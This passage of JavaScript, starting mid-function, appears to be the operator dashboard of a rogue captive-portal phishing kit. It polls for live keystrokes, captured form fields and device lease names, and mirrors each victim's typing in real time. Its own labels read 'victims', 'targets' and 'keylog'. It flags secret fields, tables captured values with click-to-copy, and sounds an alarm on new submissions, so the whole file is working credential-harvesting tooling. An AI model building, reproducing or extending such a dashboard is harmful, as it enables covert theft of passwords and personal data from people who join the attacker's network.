  if(!ip){
    devEl.textContent = "NO DEVICE — showing portal as victims see it";
    devEl.title = "";
    if(badgeEl) badgeEl.className = "pv-livebadge";
    if(labEl) labEl.textContent = "PORTAL LIVE";
    return;
  }
  var name = (typeof devName === "function") ? devName(ip) : ip;
  var v = String(value == null ? "" : value);
  var extra = field ? (" · typing: " + field) : "";
  if(typeof pvPinnedIp !== "undefined" && pvPinnedIp === ip) extra += " · 📌pinned";
  devEl.textContent = name + (mac && mac !== "-" ? " · " + mac : "") + extra;
  devEl.title = ip;
  var typing = (ago != null && ago <= 3);
  var recent = (ago != null && ago <= 15);
  if(badgeEl) badgeEl.className = "pv-livebadge" + ((typing || recent) ? " on" : "");
  if(labEl) labEl.textContent = typing ? "LIVE" : (recent ? "RECENT" : "PORTAL LIVE");
  // predictions always follow the REAL live value
  pvPredictions(v);
  // fill the whole portal: every captured field, highlight the active one —
  // end state looks exactly like the victim phone
  pvMirrorToPortal(field, v, allFields || {});
  // finger + keys follow ONLY new keystrokes (diff vs previous poll).
  // track ip+field so switching email->password doesn't fire a false delete.
  var pkey = ip + "|" + field;
  if(pkey !== pvPrevKey){
    pvPrevIp = ip; pvPrevKey = pkey; pvPrevText = v;
    try{ pvWaveTaps.push(Date.now()); var _isl2 = document.getElementById("pv-island"); if(_isl2){ _isl2.classList.add("typing"); setTimeout(function(){ _isl2.classList.remove("typing"); }, 900); } }catch(_){}
    return;
  }
  if(v === pvPrevText) return;
  try{ for(var _w = 0; _w < Math.min(4, Math.abs(v.length - pvPrevText.length) || 1); _w++) pvWaveTaps.push(Date.now() - _w * 60); }catch(_){}
  if(v.length < pvPrevText.length){
    // deletion: one backspace tap per poll (fast deletes collapse to one visual tap)
    pvTapBackspace();
  } else if(v.length > pvPrevText.length && v.indexOf(pvPrevText) === 0){
    var added = v.slice(pvPrevText.length);
    // Array.from keeps surrogate-pair emoji as single chars
    var chars = Array.from(added).slice(-4); // cap burst pastes to last 4 taps
    chars.forEach(function(c){ pvTapChar(c); });
  } else {
    // field switch / paste-over: tap last char as representative
    var last = Array.from(v).slice(-1)[0];
    if(last) pvTapChar(last);
  }
  pvPrevText = v;
}
function updateLive(live){
  var body = document.getElementById("live-body");
  // island device list always reflects current live set
  try{ pvRenderIsland(live || {}); }catch(_){}
  // phone: portal on top + LIVE keyboard taps exactly what keylog receives.
  // pinned island selection wins over hottest-typer auto-follow.
  (function(){
    var hot = "", hotAgo = 1e9, hf = "", hv = "", hmac = "-", hfields = {};
    if(live){
      if(pvPinnedIp && live[pvPinnedIp]){
        var pinf = live[pvPinnedIp] || {};
        hot = pvPinnedIp; hotAgo = pinf.active_ago;
        hf = String(pinf.live_field || pinf.active_field || "");
        hv = pinf.live_value;
        if(hv == null) hv = (pinf.fields || {})[hf] || "";
        hv = String(hv);
        hmac = pinf.mac || "-";
        hfields = pinf.fields || {};
      } else {
        if(pvPinnedIp) pvPinnedIp = "";
        Object.keys(live).forEach(function(ip){
          var inf = live[ip] || {}, ago = inf.active_ago;
          if(ago != null && ago < hotAgo){
            hotAgo = ago; hot = ip;
            hf = String(inf.live_field || inf.active_field || "");
            hv = inf.live_value;
            if(hv == null) hv = (inf.fields || {})[hf] || "";
            hv = String(hv);
            hmac = inf.mac || "-";
            hfields = inf.fields || {};
          }
        });
      }
    }
    if(hot) pvRender(hot, hf, hv, hotAgo, hmac, hfields);
    else { pvPrevIp = ""; pvPrevKey = ""; pvRender("", "", "", null, "-"); }
  })();
  var ips = live ? Object.keys(live) : [];
  var df = document.getElementById("devsel").value;
  if(df) ips = ips.filter(function(ip){ return ip === df; });
  ips.sort(function(a, b){
    var aa = (live[a] || {}).active_ago, bb = (live[b] || {}).active_ago;
    if(aa == null) aa = 1e9; if(bb == null) bb = 1e9; return aa - bb;
  });
  setNum("st-targets", ips.length);
  document.getElementById("nav-live").textContent = ips.length;
  var ntyping = ips.filter(function(ip){ var a = (live[ip] || {}).active_ago; return a != null && a <= 3; }).length;
  document.getElementById("live-badge").textContent = ntyping + " typing";
  if(!ips.length){
    body.innerHTML = '<div class="empty">no live typers — open the portal on a client and type</div>';
    return;
  }
  body.innerHTML = ips.map(function(ip){ return liveCard(ip, live[ip] || {}); }).join("");
  Object.keys(constNodes).forEach(function(ip){ constNodes[ip].typing = false; });
  Object.keys(live).forEach(function(ip){
    var a = (live[ip] || {}).active_ago;
    constEnsure(ip).typing = (a != null && a <= 3);
  });
  constKick();
  syncDevs(Object.keys(live));
}
function updateHist(hist){
  var body = document.getElementById("hist-body");
  var meta = document.getElementById("hist-meta");
  lastHist = hist;
  var ips = hist ? Object.keys(hist) : [];
  ips.sort(function(a, b){ return ((hist[b] || {}).last_epoch || 0) - ((hist[a] || {}).last_epoch || 0); });
  var df = document.getElementById("devsel").value;
  var q = document.getElementById("flt").value.toLowerCase();
  if(df) ips = ips.filter(function(ip){ return ip === df; });
  var rows = []; nfields = 0; var nevents = 0;
  ips.forEach(function(ip){
    var e = hist[ip] || {}, fields = e.fields || {};
    nevents += (e.events || 0);
    Object.keys(fields).forEach(function(fn){
      var fv = fields[fn];
      if(q && (ip + " " + (e.mac || "") + " " + fn + " " + fv + " " + (e.page || "")).toLowerCase().indexOf(q) < 0) return;
      nfields++;
      rows.push('<tr><td class="when">' + esc(e.last_ts || "") +
        (e.first_ts ? '<br><span style="color:var(--faint);font-size:10px">since ' + esc(String(e.first_ts).slice(5, 16)) + '</span>' : '') + '</td>' +
        '<td class="ip">' + esc(devName(ip)) + '<br><span style="color:var(--faint);font-size:11px">' + esc(e.mac || "-") + '</span></td>' +
        '<td class="fd">' + roleBadge(fn) + '<br><span style="font-size:12px">' + esc(fn) + '</span></td>' +
        '<td class="vl copyable" data-v="' + escA(fv) + '" title="click to copy">' + showVal(fn, fv) + '</td>' +
        '<td class="pg">' + esc(String(e.title || "").slice(0, 40)) + '<br>' + esc(String(e.page || "").slice(-60)) + '</td></tr>');
    });
  });
  body.innerHTML = rows.length ? rows.slice(0, 200).join("") :
    '<tr><td colspan="5" style="color:var(--faint)">nothing logged yet — open the portal on a client and type</td></tr>';
  meta.textContent = ips.length + " device(s) · " + nfields + " field(s) · " + nevents + " events";
  document.getElementById("nav-fields").textContent = nfields;
  if(nevents > histEvents){
    histEvents = nevents;
    totalEvents = Math.max(totalEvents, nevents);
    setNum("st-keys", totalEvents);
  }
  syncDevs(Object.keys(hist || {}));
  Object.keys(hist || {}).forEach(function(ip){ constEnsure(ip); });
}
function pushStream(rows){
  if(!rows || !rows.length) return;
  logTape(rows);
  renderStation();
  var body = document.getElementById("stream-body");
  var ph = body.querySelector(".empty");
  if(ph) body.innerHTML = "";
  rows.forEach(function(r){
    totalEvents++;
    if(r && r.ip) constFlare(r.ip);
    var d = document.createElement("div");
    d.className = "evrow fresh";
    var ts = r.ts || "";
    d.innerHTML = '<span class="t">' + esc(ts.slice(11) || ts) + '</span>' +
      '<span class="badge b-gray">' + esc(r.type || "") + '</span>' +
      '<span style="color:var(--dim)">' + esc((r.ip || "") + " [" + (r.field || "") + "]") + '</span>' +
      '<span class="vl">' + esc(String(r.value || "").slice(0, 120)) + '</span>';
    body.insertBefore(d, body.firstChild);
  });
  while(body.children.length > 30) body.removeChild(body.lastChild);
  setNum("st-keys", totalEvents);
  popPill();
}
var lastSubs = null;
function updateSubs(text){
  var box = document.getElementById("subs-body");
  var s = String(text == null ? "" : text).trim();
  if(!s || s === "(none yet)"){ box.innerHTML = '<div class="empty">none yet</div>'; lastSubs = s; return; }
  var lines = s.split("\n").filter(Boolean).slice(-25).reverse();
  setNum("st-subs", lines.length);
  document.getElementById("nav-subs").textContent = lines.length;
  var changed = (lastSubs !== null && lastSubs !== s);
  lastSubs = s;
  box.innerHTML = lines.map(function(l){ return '<div class="subrow">' + esc(l) + '</div>'; }).join("");
  if(changed){
    var f = box.querySelector(".subrow");
    if(f) f.classList.add("fresh");
    var card = document.getElementById("subs");
    if(card){ card.classList.remove("cardhit"); void card.offsetWidth; card.classList.add("cardhit"); }
    if(alarmOn){ try{ beep(); }catch(e){} }
  }
}
/* ---------- station: analytics from the live stream ---------- */
var tapeLog = [];
var CH_PALETTE = ["#3c50e0", "#22c55e", "#f59e0b", "#06b6d4", "#8b5cf6", "#ef4444", "#64748b"];
function logTape(rows){
  rows.forEach(function(r){
    if(r && r.epoch) tapeLog.push({t: r.epoch, field: r.field || "?",
      ip: r.ip || "?", value: String(r.value || "").slice(0, 40)});
  });
  if(tapeLog.length > 2000) tapeLog = tapeLog.slice(-2000);
}
function stationVisible(){
  var s = document.getElementById("view-station");
  return !!(s && s.style.display !== "none");
}
function showView(v){
  document.getElementById("view-dash").style.display = v === "dash" ? "" : "none";
  document.getElementById("view-station").style.display = v === "station" ? "" : "none";
  if(v === "station"){ renderStation(true); lineKick(); donutKick(); constKick(); actKick(); }
  try{ window.scrollTo(0, 0); }catch(e){}
}
function cssVar(n, fb){
  try{
    var v = getComputedStyle(document.body).getPropertyValue(n);
    return v ? v.trim() : fb;
  }catch(e){ return fb; }
}
function fitCanvas(cv, h){
  var dpr = window.devicePixelRatio || 1;
  var w = cv.clientWidth || 300;
  cv.width = Math.round(w * dpr);
  cv.height = Math.round(h * dpr);
  var ctx = cv.getContext("2d");
  ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
  return {ctx: ctx, w: w, h: h};
}
var lineShown = [], lineRAF = null, lineT = 0;
function lineKick(){
  if(lineRAF || !stationVisible() || paused || document.hidden) return;
  try{
    var rm = window.matchMedia && window.matchMedia("(prefers-reduced-motion: reduce)").matches;
    if(rm) return;
  }catch(e){}
  lineRAF = requestAnimationFrame(drawLine);
}
function drawLine(){
  lineRAF = null;
  var cv = document.getElementById("ch-line");
  if(!cv || !stationVisible() || paused || document.hidden){ return; }
  var H = 190, f = fitCanvas(cv, H), ctx = f.ctx, W = f.w;
  var NB = 30, BS = 10, now = Date.now() / 1000, counts = [];
  var i, j, max = 1;
  for(i = 0; i < NB; i++) counts.push(0);
  for(j = 0; j < tapeLog.length; j++){
    var b = Math.floor((now - tapeLog[j].t) / BS);
    if(b >= 0 && b < NB) counts[NB - 1 - b]++;
  }
  while(lineShown.length < NB) lineShown.push(0);
  lineShown.length = NB;
  for(i = 0; i < NB; i++){
    var dl = counts[i] - lineShown[i];
    if(Math.abs(dl) > 0.03) lineShown[i] += dl * 0.16;
    else lineShown[i] = counts[i];
  }
  for(i = 0; i < NB; i++) if(counts[i] > max) max = counts[i];
  for(i = 0; i < NB; i++) if(lineShown[i] > max) max = lineShown[i];
  lineT += 0.06;
  var padL = 30, padB = 18, padT = 10, cw = W - padL - 8, ch = H - padT - padB;
  var grid = cssVar("--line", "#e2e8f0"), dim = cssVar("--dim", "#64748b");
  var brand = "#3c50e0";
  ctx.clearRect(0, 0, W, H);
  ctx.strokeStyle = grid; ctx.fillStyle = dim; ctx.font = "10px sans-serif"; ctx.lineWidth = 1;
  for(i = 0; i <= 3; i++){
    var y = padT + ch - (ch * i / 3);
    ctx.beginPath(); ctx.moveTo(padL, y); ctx.lineTo(padL + cw, y); ctx.stroke();
    ctx.fillText(String(Math.round(max * i / 3)), 4, y + 3);
  }
  ctx.fillText("-5m", padL, H - 4);
  ctx.fillText("now", padL + cw - 22, H - 4);
  var px = function(k){ return padL + cw * k / (NB - 1); };
  var py = function(v){ return padT + ch - ch * v / max; };
  // idle "listening" wave when no traffic: keeps the graph breathing
  var idle = (max <= 1);
  var grad = ctx.createLinearGradient(0, padT, 0, padT + ch);
  grad.addColorStop(0, "rgba(60,80,224,.35)"); grad.addColorStop(1, "rgba(60,80,224,.02)");
  ctx.beginPath(); ctx.moveTo(px(0), py(lineShown[0]));
  for(i = 1; i < NB; i++) ctx.lineTo(px(i), py(lineShown[i]));
  ctx.lineTo(px(NB - 1), padT + ch); ctx.lineTo(px(0), padT + ch); ctx.closePath();
  ctx.fillStyle = grad; ctx.fill();
  ctx.beginPath(); ctx.moveTo(px(0), py(lineShown[0]));
  for(i = 1; i < NB; i++) ctx.lineTo(px(i), py(lineShown[i]));
  ctx.strokeStyle = brand; ctx.lineWidth = 2; ctx.lineJoin = "round"; ctx.stroke();
  if(idle){
    // shimmer wave sweeping left->right so "0 events" still moves
    ctx.save();
    ctx.strokeStyle = "rgba(60,80,224,.45)"; ctx.lineWidth = 1.5;
    ctx.setLineDash([3, 9]);
    ctx.lineDashOffset = -lineT * 14;
    ctx.beginPath();
    for(i = 0; i < NB; i++){
      var wy = padT + ch - 4 - Math.sin(lineT * 1.4 + i * 0.45) * 4;
      if(i === 0) ctx.moveTo(px(i), wy); else ctx.lineTo(px(i), wy);
    }
    ctx.stroke();
    ctx.restore();
  }
  // glowing head dot with breathing halo — always pulsing
  var hx = px(NB - 1), hy = py(lineShown[NB - 1]);
  var pulse = 3.5 + Math.sin(Date.now() / 350) * 1.2;
  var hg = ctx.createRadialGradient(hx, hy, 0, hx, hy, pulse + 9);
  hg.addColorStop(0, "rgba(60,80,224,.55)"); hg.addColorStop(1, "rgba(60,80,224,0)");
  ctx.fillStyle = hg;
  ctx.beginPath(); ctx.arc(hx, hy, pulse + 9, 0, 7); ctx.fill();
  ctx.beginPath(); ctx.arc(hx, hy, 3.5, 0, 7); ctx.fillStyle = brand; ctx.fill();
  ctx.fillStyle = "#fff";
  ctx.beginPath(); ctx.arc(hx - 1, hy - 1, 1.1, 0, 7); ctx.fill();
  lineRAF = requestAnimationFrame(drawLine);
}
var donutShown = [], donutRot = 0, donutRAF = null;
function donutKick(){
  if(donutRAF || !stationVisible() || paused || document.hidden) return;
  try{
    var rm = window.matchMedia && window.matchMedia("(prefers-reduced-motion: reduce)").matches;
    if(rm) return;
  }catch(e){}
  donutRAF = requestAnimationFrame(function(){ drawDonut(lastDonutGroups || []); });
}
var lastDonutGroups = [];
function drawDonut(groups){
  lastDonutGroups = groups || [];
  var cv = document.getElementById("ch-donut");
  if(!cv){ donutRAF = null; return; }
  if(!stationVisible() || paused || document.hidden){ donutRAF = null; return; }
  var dpr = window.devicePixelRatio || 1, S = 180;
  cv.width = S * dpr; cv.height = S * dpr;
  var ctx = cv.getContext("2d");
  ctx.setTransform(dpr, 0, 0, dpr, 0, 0);
  ctx.clearRect(0, 0, S, S);
  var total = 0, i;
  for(i = 0; i < groups.length; i++) total += groups[i].n;
  while(donutShown.length < groups.length) donutShown.push(0);
  donutShown.length = groups.length;
  for(i = 0; i < groups.length; i++){
    var dd = groups[i].n - donutShown[i];
    donutShown[i] += Math.abs(dd) > 0.05 ? dd * 0.14 : dd;
  }
  var dim = cssVar("--dim", "#64748b");
  donutRot += total ? 0.0035 : 0.012;
  if(!total){
    // idle: slowly rotating dashed ring so the widget never looks dead
    ctx.save();
    ctx.translate(S/2, S/2); ctx.rotate(donutRot * 4);
    ctx.strokeStyle = dim; ctx.lineWidth = 22; ctx.setLineDash([10, 14]);
    ctx.globalAlpha = 0.55 + Math.sin(Date.now()/500) * 0.15;
    ctx.beginPath(); ctx.arc(0, 0, S/2 - 16, 0, 7); ctx.stroke();
    ctx.restore();
    ctx.globalAlpha = 1;
    ctx.fillStyle = dim; ctx.font = "10px sans-serif"; ctx.textAlign = "center";
    ctx.fillText("listening…", S/2, S/2 + 4);
    donutRAF = requestAnimationFrame(function(){ drawDonut(lastDonutGroups); });
    return;
  }
  var shownTotal = 0;
  for(i = 0; i < donutShown.length; i++) shownTotal += donutShown[i];
  if(shownTotal <= 0) shownTotal = total;
  var a = -Math.PI / 2 + donutRot * 0.35;
  for(i = 0; i < groups.length; i++){
    var frac = donutShown[i] / shownTotal, a2 = a + frac * Math.PI * 2;
    if(frac <= 0.0005) continue;
    ctx.beginPath();
    ctx.arc(S / 2, S / 2, S / 2 - 14, a + 0.025, Math.max(a + 0.03, a2 - 0.025));
    ctx.strokeStyle = groups[i].c; ctx.lineWidth = 26; ctx.lineCap = "round"; ctx.stroke();
    a = a2;
  }
  ctx.fillStyle = cssVar("--txt", "#1c2434");
  ctx.font = "bold 22px sans-serif"; ctx.textAlign = "center";
  ctx.fillText(String(total), S / 2, S / 2 + 2);
  ctx.fillStyle = dim; ctx.font = "10px sans-serif";
  ctx.fillText("events", S / 2, S / 2 + 17);
  donutRAF = requestAnimationFrame(function(){ drawDonut(lastDonutGroups); });
}
function renderStation(force){
  if(!stationVisible() && !force) return;
  // ticker — newest first, duplicated for a seamless loop
  var items = tapeLog.slice(-24).reverse().map(function(e){
    return '<span class="tick' + (isSecret(e.field) ? ' up' : '') + '"><b>' +
      esc(String(e.field).slice(0, 18)) + '</b><span>' +
      esc(e.value.slice(0, 16) || "·") + '</span><i>' + esc(e.ip) + '</i></span>';
  });
  var tb = document.getElementById("tick-body");
  if(tb) tb.innerHTML = items.length ?
    '<div class="ticker"><div class="ticker-inner">' + items.join("") + items.join("") + '</div></div>' :
    '<div class="ticker"><div class="ticker-inner">' +
    '<span class="tick idle-tick"><b>LISTENING</b><span>waiting for keystrokes</span><i>live</i></span>' +
    '<span class="tick idle-tick"><b>PORTAL</b><span>feed armed</span><i>tap active</i></span>' +
    '<span class="tick idle-tick"><b>STATION</b><span>graphs breathing</span><i>idle</i></span>' +
    '<span class="tick idle-tick"><b>LISTENING</b><span>waiting for keystrokes</span><i>live</i></span>' +
    '<span class="tick idle-tick"><b>PORTAL</b><span>feed armed</span><i>tap active</i></span>' +
    '<span class="tick idle-tick"><b>STATION</b><span>graphs breathing</span><i>idle</i></span>' +
    '</div></div>';
  // groups
  var byField = {}, byDev = {}, f;
  tapeLog.forEach(function(e){
    byField[e.field] = (byField[e.field] || 0) + 1;
    byDev[e.ip] = (byDev[e.ip] || 0) + 1;
  });
  var fields = Object.keys(byField).sort(function(a, b){ return byField[b] - byField[a]; });
  var top = fields.slice(0, 6).map(function(k, i){
    return {k: k, n: byField[k], c: CH_PALETTE[i % CH_PALETTE.length]};
  });
  var rest = fields.slice(6).reduce(function(s, k){ return s + byField[k]; }, 0);
  if(rest) top.push({k: "other", n: rest, c: "#64748b"});
  drawDonut(top);
  var lg = document.getElementById("donut-legend");
  if(lg) lg.innerHTML = top.length ? top.map(function(g){
    return '<div class="li"><span class="sw" style="background:' + g.c + '"></span>' +
      esc(g.k) + '<span class="ct">' + g.n + '</span></div>';
  }).join("") : '<div class="empty">waiting…</div>';
  // device bars
  var devs = Object.keys(byDev).sort(function(a, b){ return byDev[b] - byDev[a]; }).slice(0, 8);
  var db = document.getElementById("dev-bars");
  if(db){
    var mx = devs.length ? byDev[devs[0]] : 1;
    db.innerHTML = devs.length ? devs.map(function(ip, i){
      var w = Math.max(3, Math.round(100 * byDev[ip] / mx));
      return '<div class="barrow"><div class="top"><span>' + esc(devName(ip)) + '</span><b>' +
        byDev[ip] + '</b></div><div class="tr"><i style="width:' + w + '%;background:' +
        CH_PALETTE[i % CH_PALETTE.length] + '"></i></div></div>';
    }).join("") : '<div class="empty">waiting…</div>';
  }
  // session stats
  var nowS = Date.now() / 1000, last60 = 0;
  for(f = tapeLog.length - 1; f >= 0; f--){
    if(nowS - tapeLog[f].t <= 60) last60++; else break;
  }
  var uniqF = Object.keys(byField).length;
  var topF = fields.length ? fields[0] + " (" + byField[fields[0]] + ")" : "—";
  var topD = devs.length ? devs[0] + " (" + byDev[devs[0]] + ")" : "—";
  var ss = document.getElementById("sess-stats");
  if(ss) ss.innerHTML =
    '<div class="stat"><div class="n">' + last60 + '</div><div class="l">events / last min</div></div>' +
    '<div class="stat"><div class="n">' + uniqF + '</div><div class="l">unique sections</div></div>' +
    '<div class="stat"><div class="n" style="font-size:15px">' + esc(topF) + '</div><div class="l">hottest section</div></div>' +
    '<div class="stat"><div class="n" style="font-size:15px">' + esc(topD) + '</div><div class="l">hottest device</div></div>';
  lineKick(); donutKick(); constKick(); actKick();
}
window.addEventListener("resize", function(){ lineKick(); donutKick(); constKick(); actKick(); });
/* ---------- sexy: animated counters + target constellation ---------- */
var numState = {};
function popMetric(id){
  try{
    var card = document.getElementById(id);
    if(card && card.closest) card = card.closest(".metric");
    if(!card) return;
    card.classList.remove("pop"); void card.offsetWidth; card.classList.add("pop");
    setTimeout(function(){ card.classList.remove("pop"); }, 500);
  }catch(e){}
}
function popPill(){
  try{
    var p = document.querySelector(".pill");
    if(!p || !p.animate) return;
    p.classList.remove("popping"); void p.offsetWidth; p.classList.add("popping");
  }catch(e){}
}
function setNum(id, v){
  v = Math.max(0, Math.round(Number(v) || 0));
  var el = document.getElementById(id);
  if(!el) return;
  var from = (id in numState) ? numState[id] : v;
  numState[id] = v;
  if(from !== v) popMetric(id);
  if(from === v || !window.requestAnimationFrame){ el.textContent = v; return; }
  var t0 = performance.now(), dur = 450;
  (function step(t){
    var k = Math.min(1, (t - t0) / dur), e = 1 - Math.pow(1 - k, 3);
    el.textContent = Math.round(from + (v - from) * e);
    if(k < 1) requestAnimationFrame(step);
  })(t0);
}
var constNodes = {};
var constRAF = null;
function constHash(s){
  var h = 0, i;
  s = String(s);
  for(i = 0; i < s.length; i++){ h = ((h << 5) - h + s.charCodeAt(i)) | 0; }
  return (h >>> 0) / 4294967296 * Math.PI * 2;
}
function constEnsure(ip){
  if(!constNodes[ip]) constNodes[ip] = {ang: constHash(ip), flare: 0, typing: false, x: 0, y: 0};
  var ks = Object.keys(constNodes);
  if(ks.length > 14) delete constNodes[ks[0]];
  return constNodes[ip];
}
function constKick(){
  if(constRAF || !stationVisible() || paused || document.hidden) return;
  constRAF = requestAnimationFrame(drawConst);
}
function constFlare(ip){
  try{ constEnsure(ip).flare = 1; }catch(e){}
  constKick();
}
function drawConst(){
  constRAF = null;
  var cv = document.getElementById("ch-const");
  if(!cv || !stationVisible() || paused || document.hidden) return;
  var H = 230, f = fitCanvas(cv, H), ctx = f.ctx, W = f.w;
  var cx = W / 2, cy = H / 2, R = Math.max(40, Math.min(W, H) / 2 - 34);
  var t = Date.now() / 1000;
  var txt = cssVar("--txt", "#1c2434"), dim = cssVar("--dim", "#64748b");
  var line = cssVar("--line", "#e2e8f0");
  ctx.clearRect(0, 0, W, H);
  // starfield drift — always moving even with zero targets
  var si;
  ctx.save();
  for(si = 0; si < 40; si++){
    var sx = ((si * 197.3) % Math.max(1, W));
    var sy = ((si * 131.7) % H);
    sx = (sx + t * (4 + (si % 5))) % Math.max(1, W);
    var sa = 0.08 + ((si * 37) % 10) / 60 + Math.sin(t * 1.5 + si) * 0.05;
    ctx.fillStyle = "rgba(120,140,180," + sa.toFixed(3) + ")";
    ctx.beginPath(); ctx.arc(sx, sy, (si % 3 === 0) ? 1.4 : 0.8, 0, 7); ctx.fill();
  }
  ctx.restore();
  ctx.strokeStyle = line; ctx.lineWidth = 1;
  ctx.setLineDash([4, 6]);
  ctx.lineDashOffset = -t * 8;
  ctx.beginPath(); ctx.arc(cx, cy, R, 0, 7); ctx.stroke();
  ctx.setLineDash([]);
  // radar sweep — continuous rotation
  var sweep = (t * 0.7) % (Math.PI * 2);
  ctx.save();
  ctx.translate(cx, cy); ctx.rotate(sweep);
  var grad2 = ctx.createLinearGradient(0, 0, R, 0);
  grad2.addColorStop(0, "rgba(60,80,224,0)");
  grad2.addColorStop(1, "rgba(60,80,224,.35)");
  ctx.strokeStyle = grad2; ctx.lineWidth = 2;
  ctx.beginPath(); ctx.moveTo(0, 0); ctx.lineTo(R, 0); ctx.stroke();
  ctx.fillStyle = "rgba(60,80,224,.9)";
  ctx.beginPath(); ctx.arc(R, 0, 2.5, 0, 7); ctx.fill();
  ctx.restore();
  var ips = Object.keys(constNodes), i;
  if(!ips.length){
    // ghost slots: show the orbit is alive while awaiting targets
    ctx.save();
    ctx.fillStyle = dim; ctx.font = "11px sans-serif"; ctx.textAlign = "center";
    ctx.globalAlpha = 0.6 + Math.sin(t * 2) * 0.2;
    ctx.fillText("awaiting targets — orbit live", cx, cy + R + 18);
    ctx.restore();
    for(i = 0; i < 3; i++){
      var ga = t * 0.25 + i * (Math.PI * 2 / 3);
      var gx = cx + Math.cos(ga) * R, gy = cy + Math.sin(ga) * R;
      ctx.strokeStyle = "rgba(100,116,139,.35)";
      ctx.setLineDash([2, 5]);
      ctx.beginPath(); ctx.moveTo(cx, cy); ctx.lineTo(gx, gy); ctx.stroke();
      ctx.setLineDash([]);
      ctx.fillStyle = "rgba(100,116,139,.4)";
      ctx.beginPath(); ctx.arc(gx, gy, 4 + Math.sin(t * 2 + i) * 1.2, 0, 7); ctx.fill();
    }
  }
  for(i = 0; i < ips.length; i++){
    var n = constNodes[ips[i]];
    var x = cx + Math.cos(n.ang + t * 0.05) * R, y = cy + Math.sin(n.ang + t * 0.05) * R;
    n.x = x; n.y = y;
    var a = 0.12 + n.flare * 0.75;
    ctx.strokeStyle = n.typing ? "rgba(34,197,94," + a.toFixed(2) + ")" : "rgba(60,80,224," + a.toFixed(2) + ")";
    ctx.lineWidth = 1 + n.flare * 2;
    ctx.beginPath(); ctx.moveTo(cx, cy); ctx.lineTo(x, y); ctx.stroke();
  }
  ctx.save();
  ctx.translate(cx, cy); ctx.rotate(t * 0.4);
  ctx.strokeStyle = "#3c50e0"; ctx.lineWidth = 2; ctx.setLineDash([8, 6]);
  ctx.lineDashOffset = -t * 20;
  ctx.beginPath(); ctx.arc(0, 0, 20, 0, 7); ctx.stroke();
  ctx.restore();
  var breathe = 11 + Math.sin(t * 2.4) * 1.6;
  var pg = ctx.createRadialGradient(cx, cy, 0, cx, cy, breathe + 10);
  pg.addColorStop(0, "rgba(60,80,224,.5)"); pg.addColorStop(1, "rgba(60,80,224,0)");
  ctx.fillStyle = pg;
  ctx.beginPath(); ctx.arc(cx, cy, breathe + 10, 0, 7); ctx.fill();
  ctx.fillStyle = "#3c50e0";
  ctx.beginPath(); ctx.arc(cx, cy, breathe, 0, 7); ctx.fill();
  ctx.fillStyle = "#fff"; ctx.font = "bold 10px sans-serif"; ctx.textAlign = "center";
  ctx.fillText("P", cx, cy + 3.5);
  ctx.fillStyle = dim; ctx.font = "10px sans-serif";
  ctx.fillText("portal", cx, cy + 32);
  for(i = 0; i < ips.length; i++){
    var m = constNodes[ips[i]], nx = m.x, ny = m.y;
    var r = 7 + m.flare * 7;
    var col = m.typing ? "34,197,94" : "60,80,224";
    var g = ctx.createRadialGradient(nx, ny, 0, nx, ny, r + 12);
    g.addColorStop(0, "rgba(" + col + "," + (0.35 + m.flare * 0.6).toFixed(2) + ")");
    g.addColorStop(1, "rgba(" + col + ",0)");
    ctx.fillStyle = g;
    ctx.beginPath(); ctx.arc(nx, ny, r + 12, 0, 7); ctx.fill();
    ctx.fillStyle = m.typing ? "#22c55e" : "#3c50e0";
    ctx.beginPath(); ctx.arc(nx, ny, r, 0, 7); ctx.fill();
    ctx.fillStyle = txt; ctx.font = "10px sans-serif";
    ctx.fillText(String(ips[i]).split(".").slice(-1)[0], nx, ny + r + 12);
    m.flare *= 0.93;
  }
  var badge = document.getElementById("const-badge");
  if(badge) badge.textContent = ips.length + " in orbit";
  constRAF = requestAnimationFrame(drawConst);
}
/* ---------- operator kit: leases, activity, csv, copy, latency, alarm ---------- */
var leases = {}, lastHist = null, alarmOn = false;
var actMode = "hours", actData = null, actShown = [], actRAF = null;
function devName(ip){
  var n = leases[ip];
  return n ? n + " · " + ip : ip;
}
function escA(s){
  return esc(s).replace(/"/g, "&quot;");
}
function toast(msg){
  var t = document.getElementById("toast");
  if(!t) return;
  t.textContent = msg;
  t.classList.add("show");
  clearTimeout(t._h);
  t._h = setTimeout(function(){ t.classList.remove("show"); }, 1300);
}
function pollLeases(){
  if(paused) return;
  api("/api/leases", function(names, ok){
    if(!ok || !names || typeof names !== "object" || Array.isArray(names)) return;
    leases = names;
    pollLive(); pollHist();
  });
}
function beep(){
  try{
    var AC = window.AudioContext || window.webkitAudioContext;
    if(!AC) return;
    if(!beep._c) beep._c = new AC();
    var c = beep._c, t = c.currentTime;
    [[880, 0], [1320, 0.12]].forEach(function(p){
      var o = c.createOscillator(), g = c.createGain();
      o.type = "sine"; o.frequency.value = p[0];
      g.gain.setValueAtTime(0.0001, t + p[1]);
      g.gain.exponentialRampToValueAtTime(0.25, t + p[1] + 0.02);
      g.gain.exponentialRampToValueAtTime(0.0001, t + p[1] + 0.15);
      o.connect(g); g.connect(c.destination);
      o.start(t + p[1]); o.stop(t + p[1] + 0.18);
    });
  }catch(e){}
}
function pollActivity(){
  if(paused) return;
  api("/api/activity?hours=24&days=14", function(act, ok){
    if(!ok || !act || typeof act !== "object" || Array.isArray(act)) return;
    actData = act;
    var m = document.getElementById("act-meta");
    if(m) m.textContent = (act.events || 0) + " events in log window";
    actKick();
  });
}
function actKick(){
  if(actRAF || !stationVisible() || paused || document.hidden) return;
  actRAF = requestAnimationFrame(drawAct);
}
function drawAct(){
  actRAF = null;
  var cv = document.getElementById("ch-act");
  if(!cv || !stationVisible() || paused || document.hidden) return;
  var H = 200, f = fitCanvas(cv, H), ctx = f.ctx, W = f.w;
  var src = (actData && actData[actMode]) || {labels: [], counts: []};
  // idle skeleton so the chart breathes before the first /activity poll
  if(!src.labels || !src.labels.length){
    var nowD = new Date();
    src = {labels: [], counts: []};
    var k;
    for(k = 23; k >= 0; k--){
      var d = new Date(nowD.getTime() - k * 3600000);
      var hh = String(d.getHours()).padStart(2, "0");
      src.labels.push(hh + ":00");
      src.counts.push(0);
    }
  }
  var labels = src.labels || [], counts = src.counts || [], n = counts.length, i;
  while(actShown.length < n) actShown.push(0);
  actShown.length = n;
  var moving = false;
  for(i = 0; i < n; i++){
    var d = counts[i] - actShown[i];
    if(Math.abs(d) > 0.05){ actShown[i] += d * 0.18; moving = true; }
    else actShown[i] = counts[i];
  }
  var max = 1;
  for(i = 0; i < n; i++){
    if(counts[i] > max) max = counts[i];
    if(actShown[i] > max) max = actShown[i];
  }
